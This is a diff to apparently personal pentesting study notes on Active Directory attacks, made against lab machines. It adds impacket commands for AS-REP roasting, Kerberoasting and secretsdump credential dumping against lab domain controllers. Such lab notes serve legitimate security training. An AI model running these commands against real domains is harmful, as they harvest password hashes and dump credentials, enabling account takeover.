@@ -9,10 +9,26 @@ if there is no pre auth set for an account we can get the hash of those user acc
 to get accounts w no pre auth set:
 
 ```bash
-python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -no-pass -usersfile /home/cibbin/oscp/htb/windows/forest/users.txt 
-
-python3 /opt/impacket/examples/GetNPUsers.py htb.local/ -request
+python3 /opt/wintools/impacket/examples/GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.251.139 -usersfile users
 ```
+
+```bash
+python3 /opt/wintools/impacket/examples/GetNPUsers.py -dc-ip 10.10.5.79 spookysec.local/svc-admin -no-pass
+```
+
+## Kerberoasting
+--------
+```bash
+python3 /opt/wintools/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid -dc-ip 10.10.251.139 -request
+```
+
+
+## SecretsDump
+-------
+```bash
+python3 /opt/wintools/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat@10.10.168.11
+```
+
 
 #### What to do if pre auth is enabled?
 
